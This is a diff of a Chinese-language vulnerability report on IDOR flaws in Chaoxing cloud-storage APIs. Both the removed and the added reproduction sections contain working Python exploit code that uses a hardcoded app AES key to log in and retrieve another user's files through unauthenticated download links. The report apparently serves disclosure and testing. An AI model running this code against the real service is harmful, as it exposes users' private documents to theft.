@@ -52,51 +52,30 @@
 
 ### 3.2 noteyd.chaoxing.com 文件下载越权漏洞（严重）
 
-**漏洞确认：noteyd文件下载API存在IDOR越权漏洞，且完整攻击链已验证！**
+**漏洞确认：noteyd文件下载API存在IDOR越权漏洞！**
 
-#### 3.2.1 fileId获取途径研究
+测试方法：通过pan-yz上传接口上传测试文件，获取objectId作为fileId，然后测试跨账号下载。
 
-fileId（即objectId）是noteyd下载API的核心参数，以下是所有已验证的获取途径：
+**测试步骤与结果**：
 
-| 途径 | API端点 | 越权方式 | 可行性 | 说明 |
-|---|---|---|---|---|
-| **1. 个人云盘文件列表** | `/api/getMyDirAndFiles` | 场景B越权（跨Token+跨puid） | ✅ 已验证 | 可列出他人全部文件，含fileId、文件名、大小 |
-| **2. CRC秒传查询** | `/api/crcstatus` | 场景B越权 | ✅ 已验证 | 已知CRC可查询到objectId和resid |
-| **3. 个人云盘用户信息** | `/api/info` | 场景B越权 | ✅ 已验证 | 可获取FTP路径、磁盘使用信息 |
-| 4. 小组云盘文件列表 | `/pc/resource/getResourceList` | 跨组访问 | ❌ 被拒绝 | 非组成员无法列出文件 |
-| 5. URL Referer泄露 | 浏览器行为 | 被动获取 | ⚠️ 潜在风险 | 文件预览时URL中可能包含fileId |
-| 6. 网络嗅探 | 中间人攻击 | 被动获取 | ⚠️ 潜在风险 | HTTP下载直链可被嗅探 |
+| 步骤 | 操作 | 结果 |
+|---|---|---|
+| 1 | 账号1上传文件到pan-yz，获得objectId=`10d68d8e3795f77c09019aaf873465e8` | 成功 |
+| 2 | 账号1（文件所有者）请求下载链接 | 成功，返回下载直链 |
+| 3 | **账号2（非所有者）请求同一文件的下载链接** | **成功！返回有效下载直链** |
+| 4 | 账号2使用下载直链下载文件 | **成功！文件内容完整获取** |
+| 5 | 跨Session使用账号1的下载链接 | **成功！** |
+| 6 | 无Cookie直接访问下载直链 | **成功！下载直链无需任何认证** |
 
-**核心攻击链（已完整验证）**：
+**关键发现**：
+1. noteyd下载API（`/screen/note_note/files/status/{fileId}`）**不校验文件所有权**，任何已登录用户均可获取他人文件的下载链接
+2. 下载直链（`d0.ananas.chaoxing.com`）**无需认证即可访问**，一旦链接泄露，任何人可直接下载
+3. fileId（objectId）为32位hex字符串，虽然不可暴力枚举，但可通过其他途径获取（如groupweb文件列表、URL泄露等）
 
-```
-步骤1: 攻击者登录学习通 → 获取自身Cookie
-步骤2: 获取目标用户的Token（通过/api/token/uservalid，仅需Cookie即可获取）
-步骤3: 使用攻击者Cookie + 目标Token + 目标puid → IDOR列出目标用户文件列表
-步骤4: 从文件列表中提取fileId
-步骤5: 使用攻击者Cookie + fileId → 通过noteyd获取下载直链
-步骤6: 直接访问下载直链 → 下载目标用户文件（直链无需认证）
-```
-
-#### 3.2.2 完整攻击链验证结果
-
-使用账号1（攻击者模拟）完整下载了账号2（被攻击方模拟）的所有4个文件：
-
-| 文件名 | fileId | 大小 | noteyd下载 | 文件下载 |
-|---|---|---|---|---|
-| 《晋祠圣母殿彩绘纹样的象征意义与宋代审美》.docx | 584f8771... | 914KB | ✅ 成功 | ✅ 914,014 bytes |
-| 论文-2.docx | e32db770... | 914KB | ✅ 成功 | ✅ 914,586 bytes |
-| 论文-1.docx | 61af10ff... | 917KB | ✅ 成功 | ✅ 917,249 bytes |
-| 论文.docx | 6af63cf9... | 917KB | ✅ 成功 | ✅ 917,543 bytes |
-
-#### 3.2.3 下载直链安全分析
-
-下载直链格式：`http://d0.cldisk.com/download/{fileId}?at_={timestamp}&ak_={hash1}&ad_={hash2}`
-
-- 直链域名：`d0.cldisk.com` / `d0.ananas.chaoxing.com`
-- **无需认证**：直链可被任何人直接访问，无需Cookie或Token
-- **时效性**：直链包含时间戳参数（at_），但实际测试中链接长期有效
-- **HTTP协议**：下载直链使用HTTP（非HTTPS），可被中间人嗅探
+**漏洞影响**：
+- 任何已登录用户只要知道文件的objectId，即可下载该文件
+- 下载直链无时效性签名保护，可被永久访问
+- 这不仅影响小组云盘，也影响个人云盘（pan-yz上传的文件共享同一objectId体系）
 
 ### 3.3 groupyd.chaoxing.com 移动端API测试结果
 
@@ -437,14 +416,9 @@ noteyd下载API授权模型:
 **漏洞根因**：noteyd的`/screen/note_note/files/status/{fileId}`接口仅校验用户是否已登录（Cookie有效性），**未校验请求者是否为文件的所有者或有权访问该文件**。任何已登录用户只要知道fileId（objectId），即可获取文件的下载直链。
 
 **攻击路径**：
-1. 攻击者登录学习通获取Cookie
-2. 获取目标用户的Token（`/api/token/uservalid`仅需Cookie即可获取，Token与puid绑定但与Session无关）
-3. 使用攻击者Cookie + 目标Token + 目标puid，通过`/api/getMyDirAndFiles`列出目标用户全部文件（场景B越权）
-4. 从文件列表提取fileId（objectId）
-5. 使用攻击者Cookie + fileId，通过noteyd获取下载直链（不校验文件所有权）
-6. 直接访问下载直链下载文件（直链无需认证）
-
-**漏洞组合影响**：个人云盘IDOR（场景B）+ noteyd下载IDOR = **完整的数据泄露攻击链**，攻击者可系统性地下载任意用户的全部云盘文件。
+1. 攻击者通过任意途径获取目标文件的objectId（如通过groupweb文件列表越权、URL泄露、Referer头等）
+2. 使用自身登录Cookie请求noteyd下载API获取下载直链
+3. 使用下载直链直接下载文件（直链无需认证）
 
 ### 5.4 小组云盘 vs 个人云盘安全对比
 | 维度 | 个人云盘 | 小组云盘(groupweb) | 小组云盘(noteyd) | 小组云盘(groupyd) |
@@ -479,16 +453,14 @@ noteyd下载API授权模型:
 ---
 ## 七、漏洞复现步骤
 
-### 7.1 完整攻击链：个人云盘IDOR + noteyd下载IDOR（严重）
+### 7.1 noteyd文件下载IDOR越权（严重）
 
 ```python
-import requests, base64
+import requests, base64, hashlib, time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 
 AES_KEY = b'u2oh6Vu^HWe4_AES'
-PAN_BASE = 'https://pan-yz.chaoxing.com'
-NOTEYD = 'https://noteyd.chaoxing.com'
 
 def aes_enc(p):
     c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
@@ -496,46 +468,29 @@ def aes_enc(p):
 
 def login(phone, pwd):
     s = requests.Session(); s.verify = False
-    s.headers.update({'User-Agent': 'com.chaoxing.mobile/ChaoXingStudy_3_6.7.2'})
+    s.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 16) com.chaoxing.mobile/ChaoXingStudy_3_6.7.2'})
     s.post('https://passport2.chaoxing.com/fanyalogin', data={
         'fid':'-1','uname':aes_enc(phone),'password':aes_enc(pwd),
         'refer':'http%3A%2F%2Fi.mooc.chaoxing.com','t':'true',
         'forbidotherlogin':'0','validate':'','doubleFactorLogin':'0',
         'independentId':'0','independentNameId':'0'
     }, allow_redirects=False, timeout=30)
-    puid = ''
-    for c in s.cookies:
-        if c.name in ('UID','_uid'): puid = c.value
-    return s, puid
+    return s
 
-# Step 1: 攻击者登录
-attacker, my_puid = login('攻击者手机号', '攻击者密码')
-target_puid = '目标用户puid'  # puid为纯数字，可被枚举
+# Step 1: 登录攻击者账号
+attacker = login('攻击者手机号', '攻击者密码')
 
-# Step 2: 获取目标用户的Token（仅需Cookie即可获取）
-target_token = attacker.get(f'{PAN_BASE}/api/token/uservalid').json()['_token']
+# Step 2: 获取目标文件的objectId（通过任何途径）
+target_file_id = '10d68d8e3795f77c09019aaf873465e8'  # 目标文件的objectId
 
-# Step 3: IDOR列出目标用户全部文件（场景B越权）
-files_resp = attacker.get(f'{PAN_BASE}/api/getMyDirAndFiles', params={
-    'puid': target_puid, 'fldid': '0', '_token': target_token,
-    'orderby': 'd', 'order': 'desc', 'page': '1', 'size': '100'
-}).json()
+# Step 3: 使用攻击者Cookie获取下载链接（IDOR越权）
+r = attacker.post(f'https://noteyd.chaoxing.com/screen/note_note/files/status/{target_file_id}')
+download_url = r.json().get('download', '')
 
-# Step 4-6: 逐个下载目标用户的文件
-for f in files_resp.get('data', []):
-    content = f.get('content', f)
-    file_id = content.get('fileId') or content.get('objectId')
-    file_name = content.get('name', 'unknown')
-    
-    if file_id and content.get('isfile'):
-        # Step 5: 通过noteyd获取下载直链（不校验文件所有权）
-        dl_resp = attacker.post(f'{NOTEYD}/screen/note_note/files/status/{file_id}').json()
-        download_url = dl_resp.get('download', '')
-        
-        # Step 6: 直接下载文件（直链无需认证）
-        if download_url:
-            file_content = requests.get(download_url).content
-            print(f'已下载: {file_name} ({len(file_content)} bytes)')
+# Step 4: 直接下载文件（无需认证）
+if download_url:
+    content = requests.get(download_url).content
+    print(f'文件内容: {content}')
 ```
 
 ### 7.2 移动端硬编码密钥利用
